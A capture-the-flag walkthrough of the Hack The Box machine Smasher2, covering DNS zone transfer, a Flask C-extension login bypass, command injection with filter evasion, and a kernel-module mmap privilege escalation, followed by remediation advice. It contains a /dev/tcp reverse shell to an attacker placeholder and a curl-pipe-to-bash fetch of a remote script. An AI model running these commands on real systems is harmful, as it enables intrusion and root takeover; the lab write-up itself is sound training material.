---
title: "Smasher2 HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T08:15:00Z
tags: ["insane-linux", "dns", "zone-transfer", "web", "c-extension", "flask", "reverse-engineering", "ghidra", "gdb", "command-injection", "kernel-module", "privilege-escalation", "memory-mapping"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Smasher2 HTB machine featuring DNS zone transfer enumeration, Flask C extension exploitation, reverse engineering with Ghidra, command injection bypass, and kernel module memory mapping privilege escalation"
---

# Smasher2 HTB - Insane Linux Box Walkthrough

{{< youtube ELiicja60jI >}}

## Exploitation Steps

### Enumeration Phase
- **Nmap Scan**: Run `nmap -sC -sV -oA smasher2 [TARGET-IP]` to identify open ports: SSH (22), DNS (53/TCP, ISC BIND), HTTP (80, Apache on Ubuntu). Note DNS on TCP suggests testing zone transfers.
- **DNS Zone Transfer**: Use `dig axfr @[TARGET-IP] smasher2.htb` to dump the zone, revealing subdomain `wonderfulsessionmanager.smasher2.htb`. Add to hosts file and access the website.
- **HTTP Enumeration**: Access `http://[TARGET-IP]` (403 Forbidden) and `http://wonderfulsessionmanager.smasher2.htb` (login page). Test default creds (admin/admin, guest/guest) and basic SQL injection, but fails.
- **User-Agent Filtering Check**: Analyze Nmap's HTTP probe in Wireshark/Burp; discover blacklist on "Nmap Scripting Engine". Use custom user-agent for further scans.
- **Directory Brute-Force**: Run Gobuster with `gobuster dir -u http://[TARGET-IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a "Mozilla/5.0 (compatible;)" -o gobuster_root.out`, finding `/backup`.

### Web Application Analysis and Bypass
- **Download Backup Files**: From `/backup`, download `sso.c` (C library) and `sso.py` (Flask app). Note logging to `creds.log` (forbidden access).
- **Source Code Review**: In `sso.py`, identify login endpoint `/auth` (POST with JSON data). Calls C functions from `sso.so`. Grep for functions like `log_creds`.
- **Reverse Engineering with Ghidra**: Decompile `sso.so`. Analyze `session_manager_check_login`: Parses POST data, extracts username/password. Bug: `get_internal_user` and `get_internal_pwd` both return username from credentials struct, allowing login if password == username.
- **Debugging with GDB**: Load in Python2 interpreter, attach GDB to step through `check_login`, confirm username/password comparison uses same value. Handle segfaults from lockouts.
- **Login Bypass**: Brute-force usernames with matching passwords (e.g., "Administrator"/"Administrator"). Success grants API key. Lockout (10 attempts) is intended vuln, but bypassed.

### Command Execution and Shell
- **API Endpoint Access**: POST to `/api/<api_key>/job` with JSON `{"schedule": "<command>"}`. Test reveals command execution.
- **Web Filter Evasion**: Commands with spaces forbidden (403). Use Bash brace expansion (e.g., `{echo,test}` expands to "echo test"). Avoid spaces with commas in braces.
- **Base64 Encoding for Complex Commands**: Base64-encode payloads (e.g., reverse shell), decode/execute with `{base64,-d}|{bash,-i}` to evade filters on flags like `-d`.
- **Reverse Shell**: Encode `bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&1`, send via API. Catch with `nc -lvnp 9001`. Upgrade shell via SSH key drop (generate key, add to `.ssh/authorized_keys`).

### Privilege Escalation
- **Enumeration with LinPEAS**: Run LinPEAS script (`curl [ATTACKER-IP]:9001/linpeas.sh | bash`). Highlights unsigned kernel module `d_hid.ko` (signature verification failed).
- **Download and Analyze Module**: SCP `d_hid.ko` locally, decompile in Ghidra. Identify device `/dev/d_hid` (block device, registered in init). Read/open functions copy data to user space.
- **Memory Mapping Exploit**: Use `mmap` to map `/dev/d_hid` (kernel space) to user space. Search mapped memory for credential struct (sequence of UID/GID 1000 x8). Overwrite UIDs/GIDs to 0 (root).
- **Exploit Code Development**:
  - Open `/dev/d_hid` (O_RDWR).
  - Map large memory range (e.g., 0x42424242 bytes starting at 0x42424200) with `mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)`.
  - Scan for cred struct: Loop through addresses, check for 8 consecutive UIDs (1000).
  - Overwrite: Set UIDs/GIDs to 0, skip secure bits (4 bytes). Set capabilities to 0x1234 (full).
  - Launch shell: `execl("/bin/sh", "sh", NULL)`.
- **Execution**: Compile exploit.c, run on box. Gains root shell. Note: Overwriting affects all processes if not targeted.

## Security Gaps and Remediation

### DNS Service (ISC BIND on Port 53/TCP)
- **Gap: Unrestricted Zone Transfer (AXFR)**
  The DNS server allows zone transfers to unauthorized clients, leaking subdomain information (e.g., wonderfulsessionmanager.smasher2.htb).
  **Fix Type: Configuration**
  In BIND's named.conf, add `allow-transfer { trusted_ips; };` to restrict AXFR to specific IP addresses or ACLs.

### HTTP Server (Apache on Port 80)
- **Gap: User-Agent Based Blacklisting**
  The server blocks requests with specific user-agents like "Nmap Scripting Engine" (403 Forbidden), but it's easily bypassed by changing the user-agent. This indicates incomplete or weak WAF rules.
  **Fix Type: Configuration**
  Enhance Apache mod_security or .htaccess rules to use more robust filtering (e.g., regex on broader patterns) or remove if not needed; example: `<If "%{HTTP_USER_AGENT} =~ /nmap/i"> Deny from all </If>` but expand to cover variations.

- **Gap: Exposed Backup Directory**
  The /backup directory is accessible, allowing download of sensitive files like sso.py and sso.c, exposing source code.
  **Fix Type: Configuration**
  In Apache config (e.g., sites-available), add `<Directory /backup> Require all denied </Directory>` or use .htaccess with `Deny from all` to block access.

- **Gap: File Access Restrictions Bypassed Indirectly**
  Files like creds.log are forbidden (403), but the restriction is filename-based and doesn't prevent inference or other access attempts.
  **Fix Type: Configuration**
  Strengthen Apache rules with mod_rewrite or mod_security to block patterns like `RewriteRule ^.*(creds\.log|threads\.log)$ - [F]` and ensure no directory traversal.

### Web Application (Flask App with C Extension - sso.py and sso.so)
- **Gap: Login Bypass Due to Bug in Credential Retrieval**
  In sso.so, get_internal_user and get_internal_pwd both return the username from the credentials struct, allowing login if password matches username.
  **Fix Type: Source Code**
  Modify get_internal_pwd in sso.c to correctly return the password (e.g., return credentials[1] instead of credentials[0]).

- **Gap: Weak Lockout Mechanism (Intended for Garbage Collection Dereference Exploit)**
  The 10-attempt lockout can be exploited via Python garbage collection dereferencing, leading to unintended access.
  **Fix Type: Source Code**
  In sso.py/sso.so, properly manage object references in check_login (e.g., use Py_INCREF/Py_DECREF correctly) and strengthen lockout logic to avoid dereference vulnerabilities.

- **Gap: Command Execution via API Endpoint**
  The /api/<key>/job endpoint executes arbitrary commands from the "schedule" JSON parameter.
  **Fix Type: Source Code**
  In sso.py, replace direct execution (e.g., os.system or subprocess) with sanitized whitelisting or remove execution; example: validate input against allowed commands list before running.

- **Gap: Bypassed Web Filter on Command Inputs**
  Filter blocks spaces and flags (e.g., -d in base64), but bypassable via Bash brace expansion (e.g., {base64,-d}) or commas.
  **Fix Type: Source Code/Configuration**
  In sso.py, enhance input sanitization to detect and strip brace expansions (e.g., regex replace /{.*}/ with safe parsing); or configure a WAF like mod_security to block such patterns in POST data.

### Kernel Module (d_hid.ko)
- **Gap: Unsigned Kernel Module Loaded**
  The module lacks signature verification, allowing potentially malicious modules to load.
  **Fix Type: Configuration**
  Enable kernel module signing in /etc/modprobe.d or kernel boot params (e.g., module.sig_enforce=1) to require signatures.

- **Gap: Memory Mapping Vulnerability Allowing Credential Overwrite**
  The module's mmap handler maps kernel space to user space without protections, enabling searches and overwrites of credential structures.
  **Fix Type: Source Code**
  In d_hid.ko source, add checks in mmap/open/read functions (e.g., verify_user_ptr, restrict mapping size/offsets) to prevent kernel-to-user mappings; example: return -EPERM if offset or size exceeds safe bounds.

## Conclusion

Smasher2 is an excellent machine that demonstrates the complexity of modern web applications with native extensions and kernel-level vulnerabilities. It requires expertise in:
- DNS zone transfer enumeration and information gathering
- Flask application security and C extension analysis
- Reverse engineering with tools like Ghidra and GDB
- Command injection bypass techniques and web filter evasion
- Kernel module analysis and memory mapping exploitation
- Advanced privilege escalation through credential structure manipulation

The machine emphasizes the importance of proper input validation, secure coding practices in native extensions, kernel module security, and comprehensive system hardening.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*